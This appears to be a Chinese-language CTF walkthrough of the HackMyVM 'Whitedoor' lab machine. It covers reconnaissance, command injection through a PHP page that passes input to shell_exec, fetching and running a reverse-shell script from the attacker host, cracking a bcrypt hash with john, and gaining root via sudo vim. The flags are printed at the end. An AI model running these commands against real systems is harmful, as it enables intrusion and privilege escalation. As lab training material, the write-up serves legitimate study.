---
title: Whitedoor
author: hgbe02
date: 2024-04-02
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Whitedoor.html"
---

# whitedoor

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404021244162.png" alt="image-20240402114934820" style="zoom: 50%;" />

## 信息搜集

### 端口扫描

```bash
nmap -sCV -p 1-65535 10.0.2.17
```

```css
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              13 Nov 16 23:40 README.txt
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 3d:85:a2:89:a9:c5:45:d0:1f:ed:3f:45:87:9d:71:a6 (ECDSA)
|_  256 07:e8:c5:28:5e:84:a7:b6:bb:d5:1d:2f:d8:92:6b:a6 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Home
|_http-server-header: Apache/2.4.57 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

存在默认用户名登录的，嘿嘿

### 目录扫描

```bash
gobuster dir -u http://10.0.2.17/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html.png,jpg,zip
```

```css
/.html.png            (Status: 403) [Size: 274]
/index.php            (Status: 200) [Size: 416]
/.php                 (Status: 403) [Size: 274]
/.php                 (Status: 403) [Size: 274]
/.html.png            (Status: 403) [Size: 274]
/server-status        (Status: 403) [Size: 274]
Progress: 1323360 / 1323366 (100.00%)
```

```bash
dirsearch -u http://10.0.2.17
```

```css
[23:53:54] 403 -  274B  - /.ht_wsr.txt
[23:53:54] 403 -  274B  - /.htaccess.bak1
[23:53:54] 403 -  274B  - /.htaccess.sample
[23:53:54] 403 -  274B  - /.htaccess.save
[23:53:54] 403 -  274B  - /.htaccess_orig
[23:53:54] 403 -  274B  - /.htaccess_sc
[23:53:54] 403 -  274B  - /.htaccess.orig
[23:53:54] 403 -  274B  - /.htaccessOLD
[23:53:54] 403 -  274B  - /.htaccess_extra
[23:53:54] 403 -  274B  - /.htm
[23:53:54] 403 -  274B  - /.htaccessBAK
[23:53:54] 403 -  274B  - /.htaccessOLD2
[23:53:54] 403 -  274B  - /.htpasswd_test
[23:53:54] 403 -  274B  - /.html
[23:53:54] 403 -  274B  - /.htpasswds
[23:53:54] 403 -  274B  - /.httr-oauth
[23:53:57] 403 -  274B  - /.php
[23:55:05] 403 -  274B  - /server-status/
[23:55:05] 403 -  274B  - /server-status
```

wtf!

### 漏洞扫描

```bash
nikto -h http://10.0.2.17
```

```css
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.2.17
+ Target Hostname:    10.0.2.17
+ Target Port:        80
+ Start Time:         2024-04-01 23:57:36 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.57 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ 8102 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2024-04-01 23:57:56 (GMT-4) (20 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## 漏洞挖掘

### 实地勘察

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404021244164.png" alt="image-20240402115841276" style="zoom: 50%;" />

？？？？噩梦来袭是吧，昨天晚上搞半天那个boxing，搞不来，淦。

### ftp连接

使用默认账号密码连接：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404021244166.png" alt="image-20240402120122192" style="zoom:50%;" />

看一下这个`README.txt`：

```bash
cat README.txt 
¡Good luck!
```

。。。。。。。。。。

继续看，网页只能使用`ls`：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404021244167.png" alt="image-20240402120310120" style="zoom: 50%;" />

尝试[拼接](https://book.hacktricks.xyz/pentesting-web/command-injection)一下：

```apl
ls | id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
ls && whoami
# blackdoor.webp
# blackindex.php
# index.php
# whitedoor.jpg
# www-data
ls & whoami
# www-data
# blackdoor.webp
# blackindex.php
# index.php
# whitedoor.jpg
```

所以这种命令注入是可行的。

### 命令注入攻击

```bash
# kali1
python3 -m http.server 8888
# kali2
pwncat-cs -lp 1234
# whitedoor
ls | wget http://10.0.2.4:8888/revershell.php -O /tmp/revershell.php
ls | chmod +x /tmp/revershell.php
ls | php /tmp/revershell.php
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404021244168.png" alt="image-20240402121722887" style="zoom:50%;" />

## 提权

### 信息搜集

```css
(remote) www-data@whitedoor:/$ whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
(remote) www-data@whitedoor:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
ftp:x:102:110:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
whiteshell:x:1001:1001::/home/whiteshell:/bin/bash
Gonzalo:x:1002:1002::/home/Gonzalo:/bin/bash
polkitd:x:997:997:polkit:/nonexistent:/usr/sbin/nologin
(remote) www-data@whitedoor:/$ ls -la   
total 68
drwxr-xr-x  18 root root  4096 Nov 15 23:05 .
drwxr-xr-x  18 root root  4096 Nov 15 23:05 ..
lrwxrwxrwx   1 root root     7 Nov 15 23:05 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Nov 15 23:11 boot
drwxr-xr-x  17 root root  3320 Apr  2 05:48 dev
drwxr-xr-x  69 root root  4096 Apr  2 06:15 etc
drwxr-xr-x   4 root root  4096 Nov 16 16:58 home
lrwxrwxrwx   1 root root    30 Nov 15 23:05 initrd.img -> boot/initrd.img-6.1.0-13-amd64
lrwxrwxrwx   1 root root    30 Nov 15 23:05 initrd.img.old -> boot/initrd.img-6.1.0-13-amd64
lrwxrwxrwx   1 root root     7 Nov 15 23:05 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Nov 15 23:05 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Nov 15 23:05 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Nov 15 23:05 libx32 -> usr/libx32
drwx------   2 root root 16384 Nov 15 23:05 lost+found
drwxr-xr-x   3 root root  4096 Nov 15 23:05 media
drwxr-xr-x   2 root root  4096 Nov 15 23:05 mnt
drwxr-xr-x   2 root root  4096 Nov 15 23:05 opt
dr-xr-xr-x 141 root root     0 Apr  2 05:48 proc
drwx------   4 root root  4096 Nov 17 19:26 root
drwxr-xr-x  19 root root   540 Apr  2 05:48 run
lrwxrwxrwx   1 root root     8 Nov 15 23:05 sbin -> usr/sbin
drwxr-xr-x   3 root root  4096 Nov 16 00:10 srv
dr-xr-xr-x  13 root root     0 Apr  2 05:48 sys
drwxrwxrwt   2 root root  4096 Apr  2 06:16 tmp
drwxr-xr-x  14 root root  4096 Nov 15 23:05 usr
drwxr-xr-x  12 root root  4096 Nov 16 00:09 var
lrwxrwxrwx   1 root root    27 Nov 15 23:05 vmlinuz -> boot/vmlinuz-6.1.0-13-amd64
lrwxrwxrwx   1 root root    27 Nov 15 23:05 vmlinuz.old -> boot/vmlinuz-6.1.0-13-amd64
(remote) www-data@whitedoor:/$ cd /var/www/html
(remote) www-data@whitedoor:/var/www/html$ ls -la
total 92
drwxr-xr-x 2 root root  4096 Nov 16 20:44 .
drwxr-xr-x 3 root root  4096 Nov 16 00:09 ..
-rw-r--r-- 1 root root  4040 Nov 16 12:47 blackdoor.webp
-rw-r--r-- 1 root root  1405 Nov 16 20:44 blackindex.php
-rw-r--r-- 1 root root  1174 Nov 16 12:50 index.php
-rw-r--r-- 1 root root 72239 Nov 16 10:40 whitedoor.jpg
(remote) www-data@whitedoor:/var/www/html$ cat blackindex.php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title></title>
</head>
<body>
    <h1></h1>

    <?php
    $ruta_imagen = 'blackdoor.webp';
    ?>

    <img src="<?php echo $ruta_imagen; ?>" alt="">

    <!-- Formulario de Comandos -->
    <form action="blackindex.php" method="post">
        <label for="entrada"></label>
        <textarea name="entrada" rows="4" cols="50" required></textarea>
        <br>
        <button type="submit" name="submit">Send</button>
    </form>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["submit"])) {
        $entrada = $_POST["entrada"];

        // Verificar si el comando incluye "ls" y se intenta listar /home/Gonzalo o /home/Gonzalo/Desktop
        if (preg_match("/\b(ls|dir)\s+\/home\/Gonzalo(\b|\/Desktop\b)/i", $entrada)) {
            echo "<p>Permission denied to execute ls on /home/Gonzalo</p>";
        } else {
            // Mostrar la entrada en la tabla de comandos
            echo "<h2></h2>";
            echo "<table border='1'>";
            echo "<tr><td><pre>" . htmlspecialchars($entrada) . "</pre></td></tr>";
            echo "</table>";

            // Ejecutar la entrada como comandos y mostrar el resultado
            echo "<h2></h2>";
            $output = shell_exec($entrada);
            echo "<pre>" . htmlspecialchars($output) . "</pre>";
        }
    }
    ?>
</body>
</html>
(remote) www-data@whitedoor:/var/www/html$ cd ..
(remote) www-data@whitedoor:/var/www$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Nov 16 00:09 .
drwxr-xr-x 12 root root 4096 Nov 16 00:09 ..
drwxr-xr-x  2 root root 4096 Nov 16 20:44 html
(remote) www-data@whitedoor:/var/www$ cd ..;ls -la
total 48
drwxr-xr-x 12 root root  4096 Nov 16 00:09 .
drwxr-xr-x 18 root root  4096 Nov 15 23:05 ..
drwxr-xr-x  2 root root  4096 Nov 17 18:22 backups
drwxr-xr-x 10 root root  4096 Nov 16 00:09 cache
drwxr-xr-x 25 root root  4096 Nov 16 21:06 lib
drwxrwsr-x  2 root staff 4096 Sep 29  2023 local
lrwxrwxrwx  1 root root     9 Nov 15 23:05 lock -> /run/lock
drwxr-xr-x  8 root root  4096 Apr  2 05:48 log
drwxrwsr-x  2 root mail  4096 Nov 15 23:05 mail
drwxr-xr-x  2 root root  4096 Nov 15 23:05 opt
lrwxrwxrwx  1 root root     4 Nov 15 23:05 run -> /run
drwxr-xr-x  3 root root  4096 Nov 15 23:05 spool
drwxrwxrwt  2 root root  4096 Apr  2 05:48 tmp
drwxr-xr-x  3 root root  4096 Nov 16 00:09 www
(remote) www-data@whitedoor:/var$ cd /home
(remote) www-data@whitedoor:/home$ ls
Gonzalo  whiteshell
(remote) www-data@whitedoor:/home$ cd Gonzalo
bash: cd: Gonzalo: Permission denied
(remote) www-data@whitedoor:/home$ cd whiteshell
(remote) www-data@whitedoor:/home/whiteshell$ ls -la
total 48
drwxr-xr-x 9 whiteshell whiteshell 4096 Nov 17 18:47 .
drwxr-xr-x 4 root       root       4096 Nov 16 16:58 ..
lrwxrwxrwx 1 root       root          9 Nov 16 00:43 .bash_history -> /dev/null
-rw-r--r-- 1 whiteshell whiteshell  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 whiteshell whiteshell 3526 Apr 23  2023 .bashrc
drwxr-xr-x 3 whiteshell whiteshell 4096 Nov 16 17:05 .local
-rw-r--r-- 1 whiteshell whiteshell  807 Apr 23  2023 .profile
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 18:43 Desktop
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 Documents
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 Downloads
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 Music
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 Pictures
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 Public
(remote) www-data@whitedoor:/home/whiteshell$ cd Desktop/
(remote) www-data@whitedoor:/home/whiteshell/Desktop$ ls -la
total 12
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 18:43 .
drwxr-xr-x 9 whiteshell whiteshell 4096 Nov 17 18:47 ..
-r--r--r-- 1 whiteshell whiteshell   56 Nov 16 09:07 .my_secret_password.txt
(remote) www-data@whitedoor:/home/whiteshell/Desktop$ cat .my_secret_password.txt 
whiteshell:VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K
```

找到两个用户`whiteshell`和`Gonzalo`

找到密码，切换用户。

### 切换whitedoor用户

```apl
whiteshell 
VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K
```

正常连没连上，感觉加密了，`base64`解密一下

```bash
echo 'VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K' | base64 -d
VGgxc0lzVGgzUDRzU3dPckRibGFjNQo=
echo 'VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K' | base64 -d | base64 -d
Th1sIsTh3P4sSwOrDblac5
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404021244169.png" alt="image-20240402123215917" style="zoom:50%;" />

### 信息搜集

```css
whiteshell@whitedoor:~$ whoami;id
whiteshell
uid=1001(whiteshell) gid=1001(whiteshell) groups=1001(whiteshell)
whiteshell@whitedoor:~$ cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
cat: /etc/cron.weekly: Is a directory
cat: /etc/cron.yearly: Is a directory
whiteshell@whitedoor:~$ ls -la
total 48
drwxr-xr-x 9 whiteshell whiteshell 4096 Nov 17 18:47 .
drwxr-xr-x 4 root       root       4096 Nov 16 16:58 ..
lrwxrwxrwx 1 root       root          9 Nov 16 00:43 .bash_history -> /dev/null
-rw-r--r-- 1 whiteshell whiteshell  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 whiteshell whiteshell 3526 Apr 23  2023 .bashrc
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 18:43 Desktop
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 Documents
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 Downloads
drwxr-xr-x 3 whiteshell whiteshell 4096 Nov 16 17:05 .local
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 Music
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 Pictures
-rw-r--r-- 1 whiteshell whiteshell  807 Apr 23  2023 .profile
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 Public
whiteshell@whitedoor:~$ cd .local
whiteshell@whitedoor:~/.local$ ls
share
whiteshell@whitedoor:~/.local$ cd share
whiteshell@whitedoor:~/.local/share$ ls
nano
whiteshell@whitedoor:~/.local/share$ cd nano
whiteshell@whitedoor:~/.local/share/nano$ ls
whiteshell@whitedoor:~/.local/share/nano$ ls -la
total 8
drwx------ 2 whiteshell whiteshell 4096 Nov 16 17:05 .
drwx------ 3 whiteshell whiteshell 4096 Nov 16 17:05 ..
whiteshell@whitedoor:~/.local/share/nano$ cd ../../../
whiteshell@whitedoor:~$ sudo -l
[sudo] password for whiteshell: 
Sorry, user whiteshell may not run sudo on whitedoor.
whiteshell@whitedoor:~$ cd ../
whiteshell@whitedoor:/home$ ls
Gonzalo  whiteshell
whiteshell@whitedoor:/home$ cd Gonzalo/
whiteshell@whitedoor:/home/Gonzalo$ ls -la
total 52
drwxr-x--- 9 Gonzalo whiteshell 4096 Nov 17 18:11 .
drwxr-xr-x 4 root    root       4096 Nov 16 16:58 ..
-rw------- 1 Gonzalo Gonzalo     718 Nov 17 20:06 .bash_history
-rw-r--r-- 1 Gonzalo Gonzalo     220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 Gonzalo Gonzalo    3526 Apr 23  2023 .bashrc
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17 19:26 Desktop
drwxr-xr-x 2 root    Gonzalo    4096 Nov 16 21:04 Documents
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17 18:09 Downloads
drwxr-xr-x 3 Gonzalo Gonzalo    4096 Nov 16 17:03 .local
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17 18:11 Music
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17 18:07 Pictures
-rw-r--r-- 1 Gonzalo Gonzalo     807 Apr 23  2023 .profile
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17 18:09 Public
whiteshell@whitedoor:/home/Gonzalo$ cd Desktop/
whiteshell@whitedoor:/home/Gonzalo/Desktop$ ls -la
total 16
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17 19:26 .
drwxr-x--- 9 Gonzalo whiteshell 4096 Nov 17 18:11 ..
-r--r--r-- 1 root    root         61 Nov 16 20:49 .my_secret_hash
-rw-r----- 1 root    Gonzalo      20 Nov 16 21:54 user.txt
whiteshell@whitedoor:/home/Gonzalo/Desktop$ cat user.txt 
cat: user.txt: Permission denied
whiteshell@whitedoor:/home/Gonzalo/Desktop$ cat .my_secret_hash 
$2y$10$CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj/Y48ZlAbQF6
```

找到第二个密钥。

### 登录Gonzalo

#### 爆破hash

```bash
echo '$2y$10$CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj/Y48ZlAbQF6' > pass_hash
john pass_hash -w /usr/share/wordlists/rockyou.txt 2>/dev/null
```

```apl
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
qwertyuiop       (?)     
```

爆破出来了密码，登录一下：

```bash
ssh Gonzalo@10.0.2.17
qwertyuiop
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404021244170.png" alt="image-20240402124144983" style="zoom: 50%;" />

### vim提权

#### 信息搜集

```bash
Gonzalo@whitedoor:~$ sudo -l
Matching Defaults entries for Gonzalo on whitedoor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User Gonzalo may run the following commands on whitedoor:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
```

直接提权：

```bash
sudo vim config help
:/bin/bash
```

这可太熟了，哈哈哈

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404021244171.png" alt="image-20240402124342196" style="zoom:50%;" />

拿到flag！

```apl
Y0uG3tTh3Us3RFl4g!!
Y0uAr3Th3B3sTy0Ug3Tr0oT!!
```

